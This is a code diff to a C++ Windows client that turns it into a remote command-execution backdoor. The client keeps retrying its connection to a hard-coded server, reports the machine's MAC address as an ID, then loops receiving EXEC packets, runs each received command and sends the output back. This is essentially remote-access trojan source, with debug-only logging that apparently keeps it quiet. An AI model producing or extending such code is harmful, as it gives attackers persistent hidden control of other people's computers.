@@ -19,10 +19,6 @@ string MAC;
 int main(int argc, char** argv) {
 	MAC = getMAC();
 
-	cout << MAC << endl;
-
-	system("pause");
-
 	WSAData wsaData;
 	if (WSAStartup(MAKEWORD(2, 1), &wsaData)) {
 #ifdef DEBUG
@@ -38,28 +34,33 @@ int main(int argc, char** argv) {
 	addr.sin_family = AF_INET;
 
 	SOCKET conn = socket(AF_INET, SOCK_STREAM, NULL);
-	if (connect(conn, (SOCKADDR*)&addr, addr_len) == INVALID_SOCKET) {
+	while (connect(conn, (SOCKADDR*)&addr, addr_len) == INVALID_SOCKET) {
+		Sleep(1000);
 #ifdef DEBUG
 		cout << "Can't connect to " << ADDR << ":" << PORT << endl;
 #endif
-		exit(1);
 	}
 
 #ifdef DEBUG
 	cout << "Connected!" << endl;
 #endif
 
-	SocketData setIdSocket;
-	setIdSocket.tag = SocketTag::SET_ID;
-	setIdSocket.data = MAC;
+	_send(conn, SocketTag::SET_ID, MAC);	// Send id to server
 
-	_send(conn, setIdSocket);	// Send id to server
-
-	SocketData sData;
+	SocketData packet;
 	
 	while (true) {
-		_send(conn, SOCKET_NOP);
-		Sleep(2000);
+		_recv_wait(conn, packet);
+
+		switch (packet.tag) {
+
+			case SocketTag::EXEC: {
+				string result = exec(packet.data.c_str());
+				_send(conn, SocketTag::EXEC, result);
+				break;
+			}
+
+		}
 	}
 
 	closesocket(conn);
